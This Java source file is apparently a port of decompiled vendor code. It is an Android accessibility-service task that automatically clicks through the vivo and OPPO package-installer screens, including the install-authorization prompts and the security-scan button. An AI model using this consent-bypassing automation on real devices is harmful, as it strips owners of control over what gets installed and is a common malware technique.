/**
 * 安装器调度任务 — PackageInstallerDelegate 的 7 个 case 分发。
 *
 * vendor 原始类: o/w.java (250 行)
 * 7 switch cases 处理安装流程:
 *   case 0: 初始安装流程
 *   case 1: vivo 专用安装 (checkbox + continue)
 *   case 2: 通用安装 (checkbox + continue)
 *   case 3/4: 对话框安装匹配
 *   case 5: OPPO 安装流程 (准备安装、授权安装、扫描按钮)
 *   default: OPPO 安装完成匹配
 */
package com.guard.wallet.delegate.task;

import android.util.Log;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;

public final class PackageInstallerTask implements Runnable {

    /** vendor a — dispatch case id */
    public final int a;

    /** vendor b — reference to PackageInstallerDelegate (x) */
    public final com.guard.wallet.delegate.PackageInstallerDelegate b;

    public PackageInstallerTask(com.guard.wallet.delegate.PackageInstallerDelegate xVar, int caseId) {
        this.a = caseId;
        this.b = xVar;
    }

    @Override
    public final void run() {
        int caseId = this.a;
        com.guard.wallet.delegate.PackageInstallerDelegate installer = this.b;

        switch (caseId) {
            case 0:
                /* Initial install flow */
                installer.W();
                return;

            case 1:
                /* vivo-specific: checkbox -> continue -> finish */
                if (installer.I()) {
                    Log.d("PackageInstallerDelegate", "vivo findCheckBoxAndClick Success");
                    com.guard.wallet.utils.SystemHelper.T0(25);
                }
                if (installer.J()) {
                    Log.d("PackageInstallerDelegate", "vivo findContinueBtnAndClick Success");
                    com.guard.wallet.utils.SystemHelper.T0(10);
                    installer.L();
                }
                installer.o.remove("commonInstallMatch");
                return;

            case 2:
                /* Common install: checkbox -> continue -> finish */
                if (installer.I()) {
                    Log.d("PackageInstallerDelegate", "findCheckBoxAndClick Success");
                    com.guard.wallet.utils.SystemHelper.T0(25);
                }
                if (installer.J()) {
                    Log.d("PackageInstallerDelegate", "findContinueBtnAndClick Success");
                }
                installer.L();
                installer.o.remove("commonInstallMatch");
                return;

            case 3:
                /* Dialog install match — continue -> finish */
                if (installer.J()) {
                    Log.d("PackageInstallerDelegate", "dialogInstallMatch findContinueBtnAndClick Success");
                }
                installer.L();
                return;

            case 4:
                /* Dialog install match (duplicate case) — continue -> finish */
                if (installer.J()) {
                    Log.d("PackageInstallerDelegate", "dialogInstallMatch findContinueBtnAndClick Success");
                }
                installer.L();
                return;

            case 5:
                /* OPPO install flow: detect prepare/scan/auth install states */
                handleOplusInstall(installer);
                return;

            default:
                /* OPPO install done match */
                if (installer.O()) {
                    Log.d("PackageInstallerDelegate", "oplusInstallDoneMatch isInstalling Success");
                } else {
                    if (installer.K()) {
                        Log.d("PackageInstallerDelegate", "oplusInstallDoneMatch findOplusDoneBtnAndClick Success");
                    }
                    installer.L();
                }
        }
    }

    /**
     * Handle OPPO (oplus) specific install flow — case 5.
     * Checks: prepare install -> installing -> checkbox -> auth install -> scan button -> done.
     */
    private void handleOplusInstall(com.guard.wallet.delegate.PackageInstallerDelegate installer) {
        /* Check if in "prepare install" state */
        boolean isPrepareInstall;
        label_prepare: {
            UiObject root = installer.k();
            if (root != null) {
                MyAccessibilityService.I(installer.k());
                UiObject rootForSearch = installer.k();
                CombineFiltersWithOr prepareFilters = new CombineFiltersWithOr();
                prepareFilters.setFilters(new LinkedList<>());

                /* OPPO_PREPARE_INSTALL_TEXT filter */
                List filters1 = prepareFilters.getFilters();
                CombineFilter f1 = new CombineFilter();
                f1.setStringConditions(new LinkedList<>());
                StringCondition sc1 = new StringCondition();
                sc1.setProperty("text");
                sc1.setPrefix(com.guard.wallet.utils.LocateValuesUtils.getValue("OPPO_PREPARE_INSTALL_TEXT"));
                f1.getStringConditions().add(sc1);
                filters1.add(f1);

                /* OPPO_PARSE_APP_TEXT filter */
                List filters2 = prepareFilters.getFilters();
                CombineFilter f2 = new CombineFilter();
                f2.setStringConditions(new LinkedList<>());
                StringCondition sc2 = new StringCondition();
                sc2.setProperty("text");
                sc2.setPrefix(com.guard.wallet.utils.LocateValuesUtils.getValue("OPPO_PARSE_APP_TEXT"));
                f2.getStringConditions().add(sc2);
                filters2.add(f2);

                /* OPPO_SCAN_APP_TEXT filter */
                List filters3 = prepareFilters.getFilters();
                CombineFilter f3 = new CombineFilter();
                f3.setStringConditions(new LinkedList<>());
                StringCondition sc3 = new StringCondition();
                sc3.setProperty("text");
                sc3.setPrefix(com.guard.wallet.utils.LocateValuesUtils.getValue("OPPO_SCAN_APP_TEXT"));
                f3.getStringConditions().add(sc3);
                filters3.add(f3);

                if (rootForSearch.findOneByOperateOr(prepareFilters) != null) {
                    Log.d("PackageInstallerDelegate", "准备安装节点查找成功");
                    isPrepareInstall = true;
                    break label_prepare;
                }
            }
            isPrepareInstall = false;
        }

        String logMsg;
        if (isPrepareInstall) {
            logMsg = "oplusInstallMatch isPrepareInstall Success";
        } else if (installer.O()) {
            logMsg = "oplusInstallMatch isInstalling Success";
        } else {
            com.guard.wallet.utils.SystemHelper.T0(10);

            if (installer.I()) {
                Log.d("PackageInstallerDelegate", "oplusInstallMatch findCheckBoxAndClick Success");
            }

            /* Try to find and click auth install button */
            boolean authClicked;
            label_auth: {
                if (installer.k() != null) {
                    Log.d("PackageInstallerDelegate", "开始查找授权安装按钮");
                    MyAccessibilityService.I(installer.k());
                    UiObject authBtn = installer.k().findOneByOperateOr(com.guard.wallet.delegate.PackageInstallerDelegate.M());

                    if (authBtn != null) {
                        Log.d("PackageInstallerDelegate", "授权安装查找成功");

                        /* "授权本次安装" — click at 80% x, 50% y */
                        if (authBtn.text().endsWith("授权本次安装") && !Objects.equals(authBtn.text(), "授权本次安装")) {
                            Log.d("PackageInstallerDelegate", "授权本次安装查找成功");
                            authClicked = authBtn.clickPosition(0.8F, 0.5F);
                            break label_auth;
                        }

                        /* "允许本次安装" — click at 80% x, 80% y */
                        if (authBtn.text().endsWith("允许本次安装") && !Objects.equals(authBtn.text(), "允许本次安装")) {
                            Log.d("PackageInstallerDelegate", "允许本次安装查找成功");
                            authClicked = authBtn.clickPosition(0.8F, 0.8F);
                            break label_auth;
                        }

                        /* Generic enabled click */
                        if (authBtn.enabled() && authBtn.click()) {
                            authClicked = true;
                            break label_auth;
                        }
                    }
                }
                authClicked = false;
            }

            if (authClicked) {
                logMsg = "oplusInstallMatch findOplusInstallBtnAndClick Success";
            } else {
                /* Try to find and click scan button */
                boolean scanClicked;
                label_scan: {
                    if (installer.k() != null) {
                        Log.d("PackageInstallerDelegate", "开始查找扫描按钮");
                        MyAccessibilityService.I(installer.k());
                        UiObject scanRoot = installer.k();
                        CombineFilter scanFilter = new CombineFilter();
                        /* ADAPT: inlined a.a.c() to avoid field 'a' shadowing package 'a' */
                        scanFilter.setStringConditions(new java.util.LinkedList<>());
                        StringCondition scanCond = new StringCondition();
                        scanCond.setProperty("id");
                        scanCond.setEquals("com.oplus.appdetail:id/tv_scan_tips");
                        scanFilter.getStringConditions().add(scanCond);
                        UiObject scanBtn = scanRoot.findOneByCombine(scanFilter);
                        if (scanBtn != null && scanBtn.click()) {
                            Log.d("PackageInstallerDelegate", "扫描按钮点击完成");
                            scanClicked = true;
                            break label_scan;
                        }
                    }
                    scanClicked = false;
                }

                if (!scanClicked) {
                    /* Fallback: try done button, then finish */
                    if (installer.K()) {
                        Log.d("PackageInstallerDelegate", "oplusInstallMatch findOplusDoneBtnAndClick Success");
                    }
                    installer.L();
                    return;
                }
                logMsg = "oplusInstallMatch findOplusRegionInstallAndClick Success";
            }
        }

        Log.d("PackageInstallerDelegate", logMsg);
    }
}
